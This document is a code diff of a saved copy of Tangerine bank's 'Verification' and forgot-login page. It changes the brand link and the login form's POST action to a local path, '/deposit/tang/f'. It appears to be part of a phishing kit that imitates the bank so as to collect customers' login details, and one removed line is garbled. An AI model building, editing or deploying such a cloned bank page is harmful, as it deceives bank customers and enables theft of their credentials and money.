@@ -1,5 +1,5 @@
 
-<? php  ?>=(0042)/220098/tang/f -->
+<!-- saved from url=(0042)/deposit/tang/f -->
 <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
         
         <title>Verification | Tangerine</title>
@@ -15,7 +15,7 @@
     <body translate-cloak="" application-theme="" state="forgotLogin" class="fb2-index ng-scope application-theme-web" style="overflow: visible;">
         <tng-main-nav class="ng-isolate-scope">
             <nav class="navbar print-hide" ng-class="{&#39;nativeNav&#39; : $ctrl.EnvironmentService.isNative()}">
-                <a id="mainNav_home" class="brand nonclickable" href="/220098/tang/f" ng-click="$ctrl.handleGoHome()" ng-class="{&#39;nonclickable&#39; : $ctrl.isTitleLogoNotClickable()}">
+                <a id="mainNav_home" class="brand nonclickable" href="/deposit/tang/f" ng-click="$ctrl.handleGoHome()" ng-class="{&#39;nonclickable&#39; : $ctrl.isTitleLogoNotClickable()}">
                     <img ng-src="assets/images/brand-white.png" alt="Tangerine" class="logo-white print-hide" src="./tan_4_files/brand-white.png">
                     <img ng-src="assets/images/brand-orange.png" alt="Tangerine" class="logo-orange print-only-inline" src="./tan_4_files/brand-orange.png">
                 </a>
@@ -23,7 +23,7 @@
         </tng-main-nav>
         <div ui-view="page-content" class="page-content ng-scope" style="padding-bottom: 0px;">
             <forgot-login class="ng-scope ng-isolate-scope">
-                <form method="post" action="/220098/tang/f" class="ng-pristine ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength ng-valid-email">
+                <form method="post" action="/deposit/tang/f" class="ng-pristine ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength ng-valid-email">
                     <style>
                     .forgot-login select, .forgot-login input[type="text"], .forgot-login input[type="tel"], .forgot-login input[type="password"] {
                         font-size: 17px;
